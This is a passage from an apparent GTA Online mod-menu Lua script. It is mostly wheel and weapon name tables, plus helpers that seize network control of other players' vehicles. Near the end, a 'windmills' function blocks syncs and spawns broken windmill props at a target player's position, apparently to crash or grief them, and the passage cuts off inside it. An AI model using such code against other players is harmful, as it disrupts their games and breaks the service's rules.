    T('Rod Me Up (Chrome Lip) Thin White'),
    T('Rod Me Up (Solid Color) Thin White'),
    T('Clean Thin White'),
    T('Lotta Chrome Thin White'),
    T('Spindles Thin White'),
    T('Viking Thin White'),
    T('Triple Spoke Thin White'),
    T('Pharohe Thin White'),
    T('Tiger Style Thin White'),
    T('Three Wheelin Thin White'),
    T('Big Bar Thin White'),
    T('Biohazard Thin White'),
    T('Waves Thin White'),
    T('Lick Lick Thin White'),
    T('Spiralizer Thin White'),
    T('Hypnotics Thin White'),
    T('Psycho-Delic Thin White'),
    T('Half Cut Thin White'),
    T('Super Electric Thin White'),
    T('OG Hunnets Medium White'),
    T('OG Hunnets (Chrome Lip) Medium White'),
    T('Knock-Offs Medium White'),
    T('Knock-Offs (Chrome Lip) Medium White'),
    T('Spoked Out Medium White'),
    T('Spoked Out (Chrome Lip) Medium White'),
    T('Vintage Wire Medium White'),
    T('Vintage Wire (Chrome Lip) Medium White'),
    T('Smoothie Medium White'),
    T('Smoothie (Chrome Lip) Medium White'),
    T('Smoothie (Solid Color) Medium White'),
    T('Rod Me Up Medium White'),
    T('Rod Me Up (Chrome Lip) Medium White'),
    T('Rod Me Up (Solid Color) Medium White'),
    T('Clean Medium White'),
    T('Lotta Chrome Medium White'),
    T('Spindles Medium White'),
    T('Viking Medium White'),
    T('Triple Spoke Medium White'),
    T('Pharohe Medium White'),
    T('Tiger Style Medium White'),
    T('Three Wheelin Medium White'),
    T('Big Bar Medium White'),
    T('Biohazard Medium White'),
    T('Waves Medium White'),
    T('Lick Lick Medium White'),
    T('Spiralizer Medium White'),
    T('Hypnotics Medium White'),
    T('Psycho-Delic Medium White'),
    T('Half Cut Medium White'),
    T('Super Electric Medium White'),
    T('OG Hunnets Thick White'),
    T('OG Hunnets (Chrome Lip) Thick White'),
    T('Knock-Offs Thick White'),
    T('Knock-Offs (Chrome Lip) Thick White'),
    T('Spoked Out Thick White'),
    T('Spoked Out (Chrome Lip) Thick White'),
    T('Vintage Wire Thick White'),
    T('Vintage Wire (Chrome Lip) Thick White'),
    T('Smoothie Thick White'),
    T('Smoothie (Chrome Lip) Thick White'),
    T('Smoothie (Solid Color) Thick White'),
    T('Rod Me Up Thick White'),
    T('Rod Me Up (Chrome Lip) Thick White'),
    T('Rod Me Up (Solid Color) Thick White'),
    T('Clean Thick White'),
    T('Lotta Chrome Thick White'),
    T('Spindles Thick White'),
    T('Viking Thick White'),
    T('Triple Spoke Thick White'),
    T('Pharohe Thick White'),
    T('Tiger Style Thick White'),
    T('Three Wheelin Thick White'),
    T('Big Bar Thick White'),
    T('Biohazard Thick White'),
    T('Waves Thick White'),
    T('Lick Lick Thick White'),
    T('Spiralizer Thick White'),
    T('Hypnotics Thick White'),
    T('Psycho-Delic Thick White'),
    T('Half Cut Thick White'),
    T('Super Electric Thick White'),
    T('OG Hunnets Red Line'),
    T('OG Hunnets (Chrome Lip) Red Line'),
    T('Knock-Offs Red Line'),
    T('Knock-Offs (Chrome Lip) Red Line'),
    T('Spoked Out Red Line'),
    T('Spoked Out (Chrome Lip) Red Line'),
    T('Vintage Wire Red Line'),
    T('Vintage Wire (Chrome Lip) Red Line'),
    T('Smoothie Red Line'),
    T('Smoothie (Chrome Lip) Red Line'),
    T('Smoothie (Solid Color) Red Line'),
    T('Rod Me Up Red Line'),
    T('Rod Me Up (Chrome Lip) Red Line'),
    T('Rod Me Up (Solid Color) Red Line'),
    T('Clean Red Line'),
    T('Lotta Chrome Red Line'),
    T('Spindles Red Line'),
    T('Viking Red Line'),
    T('Triple Spoke Red Line'),
    T('Pharohe Red Line'),
    T('Tiger Style Red Line'),
    T('Three Wheelin Red Line'),
    T('Big Bar Red Line'),
    T('Biohazard Red Line'),
    T('Waves Red Line'),
    T('Lick Lick Red Line'),
    T('Spiralizer Red Line'),
    T('Hypnotics Red Line'),
    T('Psycho-Delic Red Line'),
    T('Half Cut Red Line'),
    T('Super Electric Red Line'),
    T('OG Hunnets Blue Line'),
    T('OG Hunnets (Chrome Lip) Blue Line'),
    T('Knock-Offs Blue Line'),
    T('Knock-Offs (Chrome Lip) Blue Line'),
    T('Spoked Out Blue Line'),
    T('Spoked Out (Chrome Lip) Blue Line'),
    T('Vintage Wire Blue Line'),
    T('Vintage Wire (Chrome Lip) Blue Line'),
    T('Smoothie Blue Line'),
    T('Smoothie (Chrome Lip) Blue Line'),
    T('Smoothie (Solid Color) Blue Line'),
    T('Rod Me Up Blue Line'),
    T('Rod Me Up (Chrome Lip) Blue Line'),
    T('Rod Me Up (Solid Color) Blue Line'),
    T('Clean Blue Line'),
    T('Lotta Chrome Blue Line'),
    T('Spindles Blue Line'),
    T('Viking Blue Line'),
    T('Triple Spoke Blue Line'),
    T('Pharohe Blue Line'),
    T('Tiger Style Blue Line'),
    T('Three Wheelin Blue Line'),
    T('Big Bar Blue Line'),
    T('Biohazard Blue Line'),
    T('Waves Blue Line'),
    T('Lick Lick Blue Line'),
    T('Spiralizer Blue Line'),
    T('Hypnotics Blue Line'),
    T('Psycho-Delic Blue Line'),
    T('Half Cut Blue Line'),
    T('Super Electric Blue Line'),
}
Bw = {
    T('Speedway'),
    T('Street Special'),
    T('Racer'),
    T('Track Star'),
    T('Overlord'),
    T('Trident'),
    T('Triple Threat'),
    T('Stilleto'),
    T('Wires'),
    T('Bobber'),
    T('Solidus'),
    T('Ice Shield'),
    T('Loops'),
    T('Chrome Speedway'),
    T('Chrome Street Special'),
    T('Chrome Racer'),
    T('Chrome Track Star'),
    T('Chrome Overlord'),
    T('Chrome Trident'),
    T('Chrome Triple Threat'),
    T('Chrome Stilleto'),
    T('Chrome Wires'),
    T('Chrome Bobber'),
    T('Chrome Solidus'),
    T('Chrome Ice Shield'),
    T('Chrome Loops'),
    T('Romper Racing'),
    T('Warp Drive'),
    T('Snowflake'),
    T('Holy Spoke'),
    T('Old Skool Triple'),
    T('Futura'),
    T('Quarter Mile King'),
    T('Cartwheel'),
    T('Double Five'),
    T('Shuriken'),
    T('Simple Six'),
    T('Celtic'),
    T('Razer'),
    T('Twisted'),
    T('Morning Star'),
    T('Jagged Spokes'),
    T('Eidolon'),
    T('Enigma'),
    T('Big Spokes'),
    T('Webs'),
    T('Hotplate'),
    T('Bobsta'),
    T('Grouch'),
}
Hew = {
    T('Shadow'),
    T('Hyper'),
    T('Blade'),
    T('Diamond'),
    T('Supa Gee'),
    T('Chromatic Z '),
    T('Mercie Ch.Lip'),
    T('Obey RS'),
    T('GT Chrome'),
    T('Cheetah R'),
    T('Solar'),
    T('Split Ten'),
    T('Dash VIP'),
    T('LozSpeed Ten'),
    T('Carbon Inferno'),
    T('Carbon Shadow'),
    T('Carbonic Z'),
    T('Carbon Solar'),
    T('Cheetah Carbon R'),
    T('Carbon S Racer'),
    T('Chrome Shadow'),
    T('Chrome Hyper'),
    T('Chrome Blade'),
    T('Chrome Diamond'),
    T('Chrome Supa Gee'),
    T('Chrome Chromatic Z '),
    T('Chrome Mercie Ch.Lip'),
    T('Chrome Obey RS'),
    T('Chrome GT Chrome'),
    T('Chrome Cheetah R'),
    T('Chrome Solar'),
    T('Chrome Split Ten'),
    T('Chrome Dash VIP'),
    T('Chrome LozSpeed Ten'),
    T('Chrome Carbon Inferno'),
    T('Chrome Carbon Shadow'),
    T('Chrome Carbonic Z'),
    T('Chrome Carbon Solar'),
    T('Chrome Cheetah Carbon R'),
    T('Chrome Carbon S Racer'),
}
 
 Lw = {
    T('Flares'),
    T('Wired'),
    T('Triple Golds'),
    T('Big Worm'),
    T('Seven Fives'),
    T('Split Six'),
    T('Fresh Mesh'),
    T('Lead Sled'),
    T('Turbine'),
    T('Super Fin'),
    T('Classic Rod'),
    T('Dollar'),
    T('Dukes'),
    T('Low Five'),
    T('Gooch'),
    T('Chrome Flare'),
    T('Chrome Wired'),
    T('Chrome Triple Golds'),
    T('Chrome Big Worm'),
    T('Chrome Seven Fives'),
    T('Chrome Split Six'),
    T('Chrome Fresh Mesh'),
    T('Chrome Lead Sled'),
    T('Chrome Turbine'),
    T('Chrome Super Fin'),
    T('Chrome Classic Rod'),
    T('Chrome Dollar'),
    T('Chrome Dukes'),
    T('Chrome Low Five'),
    T('Chrome Gooch'),
}
 
 Mw = {
    T('Classic Five'),
    T('Dukes'),
    T('Muscle Freak'),
    T('Kracka'),
    T('Azreal'),
    T('Mecha'),
    T('Black Top'),
    T('Drag SPL'),
    T('Revolver'),
    T('Classic Rod '),
    T('Fairlie'),
    T('Spooner'),
    T('Five Star'),
    T('Old School'),
    T('El Jefe'),
    T('Dodman'),
    T('Six Gun'),
    T('Mercenary'),
    T('Chrome Classic Five'),
    T('Chrome Dukes'),
    T('Chrome Muscle Freak'),
    T('Chrome Kracka'),
    T('Chrome Azreal'),
    T('Chrome Mecha'),
    T('Chrome Black Top'),
    T('Chrome Drag SPL'),
    T('Chrome Revolver'),
    T('Chrome Classic Rod '),
    T('Chrome Fairlie'),
    T('Chrome Spooner'),
    T('Chrome Five Star'),
    T('Chrome Old School'),
    T('Chrome El Jefe'),
    T('Chrome Dodman'),
    T('Chrome Six Gun'),
    T('Chrome Mercenary'),

}
 
 Orw = {
    T('Raider'),
    T('Mudslinger'),
    T('Nevis'),
    T('Cairngorm'),
    T('Amazon'),
    T('Challenger'),
    T('Dune Basher'),
    T('Five Star'),
    T('Rock Crawler'),
    T('Mill Spec Steelie'),
    T('Chrome Raider'),
    T('Chrome Mudslinger'),
    T('Chrome Nevis'),
    T('Chrome Cairngorm'),
    T('Chrome Amazon'),
    T('Chrome Challenger'),
    T('Chrome Dune Basher'),
    T('Chrome Five Star'),
    T('Chrome Rock Crawler'),
    T('Chrome Mill Spec Steelie'),
    T('Retro Steelie'),
    T('Heavy Duty Steelie'),
    T('Concave Steelie'),
    T('Police Issue Steelie'),
    T('Lightweight Steelie'),
    T('Dukes'),
    T('Avalanche'),
    T('Mountain Man'),
    T('Rigde Climber'),
    T('Concave 5'),
    T('Flat Six'),
    T('All Terrain Monster'),
    T('Drag SPL'),
    T('Concave Rally Master'),
    T('Rugged Snowflake'),
}
 
 Rw = {
    T('Classic 5'),
    T('Classic 5 (Striped)'),
    T('Retro Star'),
    T('Retro Star (Striped)'),
    T('Triplex'),
    T('Triplex (Striped)'),
    T('70s Spec'),
    T('70s Spec (Striped)'),
    T('Super 5R'),
    T('Super 5R (Striped)'),
    T('Speedster'),
    T('Speedster (Striped)'),
    T('GP-90'),
    T('GP-90 (Striped)'),
    T('Superspoke'),
    T('Superspoke (Striped)'),
    T('Gridline'),
    T('Gridline (Striped)'),
    T('Snowflake'),
    T('Snowflake (Striped)'),
}
 
 Spw = {
    T('Inferno'),
    T('Deep Five'),
    T('Lozspeed Mk.V'),
    T('Diamond Cut'),
    T('Chrono'),
    T('Feroci RR'),
    T('FiftyNine'),
    T('Mercie'),
    T('Synthetic Z'),
    T('Organic Type 0'),
    T('Endo v.1'),
    T('GT One'),
    T('Duper 7'),
    T('Uzer'),
    T('GroundRide'),
    T('S Racer'),
    T('Venum'),
    T('Cosmo'),
    T('Dash VIP'),
    T('Ice Kid'),
    T('Ruff Weld'),
    T('Wangan Master'),
    T('Super Five'),
    T('Endo v.2'),
    T('Split Six'),
    T('Chrome Inferno'),
    T('Chrome Deep Five'),
    T('Chrome Lozspeed Mk.V'),
    T('Chrome Diamond Cut'),
    T('Chrome Chrono'),
    T('Chrome Feroci RR'),
    T('Chrome FiftyNine'),
    T('Chrome Mercie'),
    T('Chrome Synthetic Z'),
    T('Chrome Organic Type 0'),
    T('Chrome Endo v.1'),
    T('Chrome GT One'),
    T('Chrome Duper 7'),
    T('Chrome Uzer'),
    T('Chrome GroundRide'),
    T('Chrome S Racer'),
    T('Chrome Venum'),
    T('Chrome Cosmo'),
    T('Chrome Dash VIP'),
    T('Chrome Ice Kid'),
    T('Chrome Ruff Weld'),
    T('Chrome Wangan Master'),
    T('Chrome Super Five'),
    T('Chrome Endo v.2'),
    T('Chrome Split Six'),
}

 Stw = {
    T('Retro Steelie'),
    T('Poverty Spec Steelie'),
    T('Concave Steelie'),
    T('Nebula'),
    T('Hotring Steelie'),
    T('Cup Champion'),
    T('Stanced EG Custom'),
    T('Kracka Custom'),
    T('Dukes Custom'),
    T('Endo v.3 Custom'),
    T('V8 Killer'),
    T('Fujiwara Custom'),
    T('Cosmo MKII'),
    T('Aero Star'),
    T('Hype Five'),
    T('Ruff Weld Mega Deep '),
    T('Mercie Concave'),
    T('Sugoi Concave'),
    T('Synthetic Z Concave'),
    T('Endo v.4 Dished'),
    T('Hyperfresh'),
    T('Truffade Concave'),
    T('Organic Type II'),
    T('Big Mamba'),
    T('Deep Flake'),
    T('Cosmo MKIII'),
    T('Concave Racer'),
    T('Deep Flake Reverse'),
    T('Wild Wagon'),
    T('Concave Mega Mesh'),
}

 Suw = {
    T('VIP'),
    T('Benefactor'),
    T('Cosmo'),
    T('Bippu'),
    T('Royal Six '),
    T('Fagorme'),
    T('Deluxe'),
    T('Iced Out'),
    T('Cognoscenti'),
    T('LozSpeed Ten'),
    T('Supernova'),
    T('Obey RS'),
    T('LozSpeed Baller'),
    T('Extravaganzo'),
    T('Split Six'),
    T('Empowered'),
    T('Sunrise'),
    T('Dash VIP'),
    T('Cutter'),
    T('Chrome VIP'),
    T('Chrome Benefactor'),
    T('Chrome Cosmo'),
    T('Chrome Bippu'),
    T('Chrome Royal Six '),
    T('Chrome Fagorme'),
    T('Chrome Deluxe'),
    T('Chrome Iced Out'),
    T('Chrome Cognoscenti'),
    T('Chrome LozSpeed Ten'),
    T('Chrome Supernova'),
    T('Chrome Obey RS'),
    T('Chrome LozSpeed Baller'),
    T('Chrome Extravaganzo'),
    T('Chrome Split Six'),
    T('Chrome Empowered'),
    T('Chrome Sunrise'),
    T('Chrome Dash VIP'),
    T('Chrome Cutter'),
}

 Trw = {
    T('Rally Throwback'),
    T('Gravel Trap'),
    T('Stove Top'),
    T('Stove Top Mesh'),
    T('Retro 3 Piece'),
    T('Rally Monoblock'),
    T('Forged 5'),
    T('Split Star'),
    T('Speed Boy'),
    T('90s Running'),
    T('Tropos'),
    T('Exos'),
    T('High Five'),
    T('Super Luxe'),
    T('Pure Business'),
    T('Pepper Pot'),
    T('Blacktop Blender'),
    T('Throwback'),
    T('Expressway'),
    T('Hidden Six'),
    T('Dinka SPL'),
    T('Retro Turbofan'),
    T('Conical Turbofan'),
    T('Ice Storm'),
    T('Super Turbine'),
    T('Modern Mesh'),
    T('Forged Star'),
    T('Snowflake'),
    T('Giga Mesh'),
    T('Mesh Meister'),
}

 Tuw = {
    T('Cosmo'),
    T('Super Mesh'),
    T('Outsider'),
    T('Rollas'),
    T('Driftmeister'),
    T('Slicer'),
    T('El Quatro'),
    T('Dubbed'),
    T('Five Star'),
    T('Slideways'),
    T('Apex'),
    T('Stanced EG'),
    T('Countersteer'),
    T('Endo v.1'),
    T('Endo v.2 Dish'),
    T('Gruppe Z'),
    T('Choku-Dori'),
    T( 'Chicane'),
    T('Saisoku'),
    T('Dished Eight'),
    T('Fujiwara'),
    T('Zokusha'),
    T('Battle VIII'),
    T('Rally Master'),
    T('Chrome Cosmo'),
    T('Chrome Super Mesh'),
    T('Chrome Outsider'),
    T('Chrome Rollas'),
    T('Chrome Driftmeister'),
    T('Chrome Slicer'),
    T('Chrome El Quatro'),
    T('Chrome Dubbed'),
    T('Chrome Five Star'),
    T('Chrome Slideways'),
    T('Chrome Apex'),
    T('Chrome Stanced EG'),
    T('Chrome Countersteer'),
    T('Chrome Endo v.1'),
    T('Chrome Endo v.2 Dish'),
    T('Chrome Gruppe Z'),
    T('Chrome Choku-Dori'),
    T('Chrome Chicane'),
    T('Chrome Saisoku'),
    T('Chrome Dished Eight'),
    T('Chrome Fujiwara'),
    T('Chrome Zokusha'),
    T('Chrome Battle VIII'),
    T('Chrome Rally Master'),
}

    Lighc = {
        T('White'),
        T('Blue'),
        T('Electric Blue'),
        T('Mint Green'),
        T('Lime Green'),
        T('Yellow'),
        T('Golden Shower'),
        T('Orange'),
        T('Red'),
        T('Pony Pink'),
        T('Hot Pink'),
        T('Purple'),
        T('Blacklight')

    }

    Vehtogs = {
    {19 , T("Turbo")},
    {21 , T("Tire Smoke")},
    {23 , T("Xenon Headlights")},
    }

 Vehopts = { 
    {1 , T("Spoilers")},
    {2 , T("Front Bumper / Countermeasures")},
    {3 , T("Rear Bumper")},
    {4 , T("Side Skirt")},
    {5 , T("Exhaust")},
    {6 , T("Frame")},
    {7 , T("Grille")},
    {8 , T("Hood")},
    {9 , T("Fender")},
    {10 , T("Right Fender")},
    {11 , T("Roof / Weapons")},
    {12 , T("Engine")},
    {13 , T("Brakes")},
    {14 , T("Transmission")},
    {15 , T("Horns")},
    {16 , T("Suspension")},
    {17 , T("Armour")},
    {24 , T("Front Wheels")},
    {25 , T("Motorcycle Back Wheel Design")},
    {26 , T("Plate Holders")},
    {28 , T("Trim Design")},
    {29 , T("Ornaments")},
    {31 , T("Dial Design")},
    {34 , T("Steering Wheel")},
    {35 , T("Shifter Leavers")},
    {36 , T("Plaques")},
    {39 , T("Hydraulics")},
    {49 , T("Livery")},
    }

Leyen = {
    T('Railgun'),
    T('Tactical Rifle'),
    T('Heavy Sniper MK2'),
    T('Combat MG MK2'),
    T('Special Carbine MK2'),
    T('Rockets'),
    T('原子能'),
    T('手榴弹'),
    T('烟雾弹'),
    T('霰弹枪'),
    T('雪球'),
    T('烟花'),
}
Leyel = {
    'weapon_railgun',
    'WEAPON_TACTICALRIFLE',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_SPECIALCARBINE_MK2',
    'WEAPON_RPG',
    'weapon_raypistol',
    'weapon_grenadelauncher',
    'weapon_grenadelauncher_smoke',
    'weapon_combatshotgun',
    'weapon_snowball',
    'weapon_firework',
}
 Spw = {
    T('Inferno'),
    T('Deep Five'),
    T('Lozspeed Mk.V'),
    T('Diamond Cut'),
    T('Chrono'),
    T('Feroci RR'),
    T('FiftyNine'),
    T('Mercie'),
    T('Synthetic Z'),
    T('Organic Type 0'),
    T('Endo v.1'),
    T('GT One'),
    T('Duper 7'),
    T('Uzer'),
    T('GroundRide'),
    T('S Racer'),
    T('Venum'),
    T('Cosmo'),
    T('Dash VIP'),
    T('Ice Kid'),
    T('Ruff Weld'),
    T('Wangan Master'),
    T('Super Five'),
    T('Endo v.2'),
    T('Split Six'),
    T('Chrome Inferno'),
    T('Chrome Deep Five'),
    T('Chrome Lozspeed Mk.V'),
    T('Chrome Diamond Cut'),
    T('Chrome Chrono'),
    T('Chrome Feroci RR'),
    T('Chrome FiftyNine'),
    T('Chrome Mercie'),
    T('Chrome Synthetic Z'),
    T('Chrome Organic Type 0'),
    T('Chrome Endo v.1'),
    T('Chrome GT One'),
    T('Chrome Duper 7'),
    T('Chrome Uzer'),
    T('Chrome GroundRide'),
    T('Chrome S Racer'),
    T('Chrome Venum'),
    T('Chrome Cosmo'),
    T('Chrome Dash VIP'),
    T('Chrome Ice Kid'),
    T('Chrome Ruff Weld'),
    T('Chrome Wangan Master'),
    T('Chrome Super Five'),
    T('Chrome Endo v.2'),
    T('Chrome Split Six'),
}

function Getmodcou(pid, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local max = VEHICLE.GET_NUM_VEHICLE_MODS(vmod, mod)
        return max
    end
end

function Changewhepercolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, color.per, color.whe)
end

function Changehead(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color)
end

function Changewheel(pid, wtype, wheel)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local vhash = ENTITY.GET_ENTITY_MODEL(vmod)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    if VEHICLE.IS_THIS_MODEL_A_BIKE(vhash) then
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
        VEHICLE.SET_VEHICLE_MOD(vmod, 24, wheel)
    else
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
    end
end

function Changetint(pid, tint)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vmod, tint)
end

    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                wait()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end

function wait_session_transition(yield_time)
    yield_time = yield_time or 1000

    while util.is_session_transition_active() do
        wait(yield_time)
    end
end

function handle_player_list(pid) 
    local ref = GTLuaScript[pid]
    if not players.exists(pid) then
        if ref then
            GTLuaScript.delete(ref)
            GTLuaScript[pid] = nil
        end
    end
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			wait()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
function T(text)
    if type(Hexarobi_translate) == "function" then
        return Hexarobi_translate(text)
    else
        return text
    end
end
--激光眼
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end
--摇头丸
function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
local cur_state = 1
function yaoptou()
local all_peds = entities.get_all_peds_as_handles()
    for k,ped in pairs(all_peds) do 
        if not PED.IS_PED_A_PLAYER(ped) then
            request_control_of_entity_once(ped)
            TASK.CLEAR_PED_TASKS(ped)
            local c
            if cur_state == 1 then 
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, 10.0)
            else
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, -10.0)
            end
            TASK.TASK_LOOK_AT_COORD(ped, c.x, c.y, c.z, -1, 0, 2)
        end
    end
    if cur_state == 1 then 
        cur_state = 2 
    else
        cur_state = 1
    end
    wait(100)
	end
--控制台
function get_stand_stdout(tbl, n)
    local all_lines = {}
    local disp_lines = {}
    local size = #tbl
    local index = 1
    if size >= n then 
        index = #tbl - n
    end

    for i=index, size do 
        local line = tbl[i]
        local line_copy = line
        if line ~= "" and line ~= '\n' then
            all_lines[#all_lines + 1] = line
            if not timestamp_toggle then
               -- at this point, the line is already added to all lines, so we can just customize it and it wont affect STDOUT clipboard copy
                local _, second_segment = string.partition(line, ']')
                if second_segment ~= nil then
                    line = second_segment
                end
            end
            if string.len(line) > max_chars then
                disp_lines[#disp_lines + 1] = line:sub(1, max_chars) .. ' ...'
            else
                disp_lines[#disp_lines + 1] = line
            end
        end
    end

    -- full_stdout exists so that we can copy the entire console output without "aesthetic" changes or trimming
    -- disp_stdout is the aesthetic, possibly-formatted version that you actually see in-game, WITH trimming
    full_stdout = table.concat(all_lines, '\n')
    disp_stdout = table.concat(disp_lines, '\n')
end

function get_last_lines(file)
    local f = io.open(file, "r")
    local len = f:seek("end")
    f:seek("set", len - max_lines*1000)
    local text = f:read("*a")
    lines = string.split(text, '\n')
    f:close()
    get_stand_stdout(lines, max_lines)
end
--阻止传出同步的信息
function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	wait(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
--大风车
function windmills(pid)
    BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
